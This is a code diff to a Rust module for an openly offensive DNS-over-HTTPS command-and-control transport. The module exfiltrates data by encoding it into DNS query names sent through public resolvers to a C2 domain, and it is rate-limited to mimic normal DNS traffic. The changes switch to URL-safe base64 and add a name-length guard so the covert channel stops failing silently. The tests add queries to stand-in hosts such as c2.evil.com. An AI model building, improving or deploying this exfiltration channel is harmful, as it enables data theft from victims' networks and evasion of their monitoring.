@@ -7,7 +7,7 @@
 //! all serve DoH endpoints that millions of endpoints query continuously.
 //!
 //! ## Send (uplink / exfil)
-//! - Base64-encode the frame payload.
+//! - URL-safe base64-encode the frame payload (RFC 4648 §5, alphabet `A-Za-z0-9-_`, no padding — all chars are DNS-label-safe; standard base64's `+`, `/`, `=` are invalid in DNS labels).
 //! - Split into 160-byte raw chunks (fits base64-expanded within the 253-char
 //!   DNS name limit when split across 63-char labels).
 //! - For each chunk: POST to the DoH JSON API with a TXT query whose name
@@ -26,7 +26,7 @@
 use std::thread;
 use std::time::{Duration, Instant};
 
-use base64::engine::general_purpose::STANDARD as BASE64;
+use base64::engine::general_purpose::URL_SAFE_NO_PAD as BASE64;
 use base64::Engine;
 use serde_json::Value;
 use ureq::Agent;
@@ -42,6 +42,14 @@ const CHUNK_SIZE: usize = 160;
 
 /// DNS label maximum length (RFC 1035 §2.3.4).
 const MAX_LABEL_LEN: usize = 63;
+
+/// Maximum total DNS name length in bytes (RFC 1035 §2.3.4: 255 octets on the
+/// wire, of which the trailing root label/length encoding leaves 253 usable).
+/// A query name over this is rejected by resolvers as FORM_ERR; without this
+/// guard a long C2 domain + a high `send_seq` (longer `c{N}-{i}` prefix) would
+/// overflow silently, the query would never resolve, and the channel would die
+/// with no diagnostic.
+const MAX_DNS_NAME_LEN: usize = 253;
 
 /// Rate limit between successive DNS queries — 1 query/s to mimic normal DNS.
 const QUERY_INTERVAL_MS: u64 = 1_000;
@@ -111,7 +119,15 @@ impl DohDnsTransport {
 
     /// Build a DNS query name that encodes `data` (base64 text) as subdomain
     /// labels under `prefix.{domain}`.  Labels are capped at [`MAX_LABEL_LEN`].
-    fn build_query_name(&self, prefix: &str, b64_data: &str) -> String {
+    ///
+    /// Returns `Err` if the fully-assembled name exceeds [`MAX_DNS_NAME_LEN`]
+    /// bytes — a name that long is rejected by resolvers as FORM_ERR, so sending
+    /// it would silently kill the channel (the query never resolves, no error
+    /// surfaces). The overflow happens when the C2 domain is long and/or
+    /// `send_seq`/`i` grow the `c{N}-{i}` prefix past what the domain leaves
+    /// room for; this guard turns that silent failure into a transport error the
+    /// caller can react to (and that gets logged).
+    fn build_query_name(&self, prefix: &str, b64_data: &str) -> Result<String, TransportError> {
         let mut labels: Vec<&str> = Vec::new();
         let mut remaining = b64_data;
 
@@ -126,7 +142,13 @@ impl DohDnsTransport {
             remaining = &remaining[split..];
         }
 
-        format!("{}.{}.{}", prefix, labels.join("."), self.domain)
+        let qname = format!("{}.{}.{}", prefix, labels.join("."), self.domain);
+        if qname.len() > MAX_DNS_NAME_LEN {
+            return Err(TransportError::Transient(
+                "DoH query name exceeds 253-byte DNS limit (domain too long for chunk size)",
+            ));
+        }
+        Ok(qname)
     }
 
     /// POST a DoH JSON query and return the parsed response body.
@@ -146,9 +168,7 @@ impl DohDnsTransport {
             .set("Accept", DOH_CONTENT_TYPE)
             .send_json(body)
             .map_err(|e| match &e {
-                ureq::Error::Transport(_) => {
-                    TransportError::Transient("DoH transport error")
-                }
+                ureq::Error::Transport(_) => TransportError::Transient("DoH transport error"),
                 ureq::Error::Status(code, _resp) => {
                     if *code >= 500 {
                         TransportError::Transient("DoH server error")
@@ -205,7 +225,10 @@ impl Transport for DohDnsTransport {
 
             let chunk_b64 = BASE64.encode(chunk);
             let prefix = format!("c{}-{}", self.send_seq, i);
-            let qname = self.build_query_name(&prefix, &chunk_b64);
+            // `?` propagates the 253-byte overflow guard: a name too long for
+            // the configured domain would FORM_ERR at the resolver and silently
+            // kill the channel.
+            let qname = self.build_query_name(&prefix, &chunk_b64)?;
 
             // POST the DoH TXT query. The DNS response is irrelevant for
             // exfiltration — the query itself carries the data to the C2
@@ -312,7 +335,9 @@ mod tests {
     fn build_query_name_splits_into_labels() {
         let t = DohDnsTransport::new("c2.evil.com", None);
         let b64 = "A".repeat(200); // 200 chars → 4 labels (63+63+63+11)
-        let qname = t.build_query_name("c0-0", &b64);
+        let qname = t
+            .build_query_name("c0-0", &b64)
+            .expect("short domain must fit the 253-byte limit");
         assert!(qname.ends_with(".c2.evil.com"));
         assert!(qname.starts_with("c0-0."));
         // Each label must be ≤63 chars.
@@ -329,7 +354,9 @@ mod tests {
         // 160 bytes → ~216 base64 chars.
         let data = vec![0xAAu8; 160];
         let b64 = BASE64.encode(&data);
-        let qname = t.build_query_name("c0-0", &b64);
+        let qname = t
+            .build_query_name("c0-0", &b64)
+            .expect("c2.evil.com + CHUNK_SIZE must fit the 253-byte limit");
         // DNS total name must be ≤253 chars.
         assert!(
             qname.len() <= 253,
@@ -346,11 +373,32 @@ mod tests {
         let t = DohDnsTransport::new("fairly.long.c2.test.com", None);
         let data = vec![0xFFu8; CHUNK_SIZE];
         let b64 = BASE64.encode(&data);
-        let qname = t.build_query_name("c99-99", &b64);
+        let qname = t
+            .build_query_name("c99-99", &b64)
+            .expect("fairly.long.c2.test.com + CHUNK_SIZE must fit the 253-byte limit");
         assert!(
             qname.len() <= 253,
             "query name length {} exceeds 253; domain may be too long for CHUNK_SIZE",
             qname.len()
+        );
+    }
+
+    #[test]
+    fn build_query_name_rejects_over_253_bytes() {
+        // The 253-byte guard: a very long C2 domain + a full CHUNK_SIZE payload
+        // overflows the DNS name. Previously this built an over-long name that
+        // the resolver rejected as FORM_ERR, silently killing the channel; now
+        // it's a clean transport error so the caller can react (and log it).
+        let long_domain = "a".repeat(200) + ".evil.com";
+        let t = DohDnsTransport::new(long_domain, None);
+        let data = vec![0xAAu8; CHUNK_SIZE];
+        let b64 = BASE64.encode(&data);
+        let err = t
+            .build_query_name("c0-0", &b64)
+            .expect_err("a >200-char domain + CHUNK_SIZE must overflow the 253-byte limit");
+        assert!(
+            matches!(err, TransportError::Transient(_)),
+            "expected a Transient error for an over-length name, got {err:?}"
         );
     }
 
@@ -411,8 +459,53 @@ mod tests {
         let t = DohDnsTransport::new("c2.evil.com", None);
         // We can't actually hit the network in unit tests, but we can verify
         // the query name construction is valid.
-        let qname = t.build_query_name("c0-0", "dGVzdA==");
+        let qname = t
+            .build_query_name("c0-0", "dGVzdA")
+            .expect("short payload + short domain must fit the 253-byte limit");
         assert!(qname.contains("c0-0"));
         assert!(qname.ends_with("c2.evil.com"));
+    }
+
+    #[test]
+    fn url_safe_base64_emits_only_dns_label_chars() {
+        // P1-12: every byte value 0x00..=0xFF must encode to chars that are
+        // legal inside a DNS label (alnum, '-', '_'). Standard base64 would
+        // emit '+', '/', and '=' for high/random bytes — invalid in DNS labels
+        // and silently truncated by resolvers, breaking real encrypted frames.
+        let all_bytes: Vec<u8> = (0u8..=255).collect();
+        let enc = BASE64.encode(&all_bytes);
+        assert!(!enc.contains('='), "padding '=' must not appear: {enc}");
+        assert!(!enc.contains('+'), "'+' must not appear: {enc}");
+        assert!(!enc.contains('/'), "'/' must not appear: {enc}");
+        for c in enc.chars() {
+            assert!(
+                c.is_ascii_alphanumeric() || c == '-' || c == '_',
+                "non-DNS-label char '{c}' in encoded output: {enc}"
+            );
+        }
+        // Round-trip: decode must recover the original bytes.
+        let dec = BASE64.decode(&enc).expect("decode must round-trip");
+        assert_eq!(dec, all_bytes);
+    }
+
+    #[test]
+    fn build_query_name_all_dns_label_safe() {
+        // High-entropy payload (simulates an encrypted frame) must produce a
+        // query name whose every label is DNS-safe after encoding + splitting.
+        let t = DohDnsTransport::new("c2.evil.com", None);
+        let data = vec![0xFFu8; CHUNK_SIZE];
+        let b64 = BASE64.encode(&data);
+        let qname = t
+            .build_query_name("c0-0", &b64)
+            .expect("short domain + CHUNK_SIZE must fit the 253-byte limit");
+        for label in qname.split('.') {
+            for c in label.chars() {
+                // prefix label may contain '-'; everything else is b64.
+                assert!(
+                    c.is_ascii_alphanumeric() || c == '-' || c == '_',
+                    "label '{label}' has non-DNS-safe char '{c}' in qname {qname}"
+                );
+            }
+        }
     }
 }
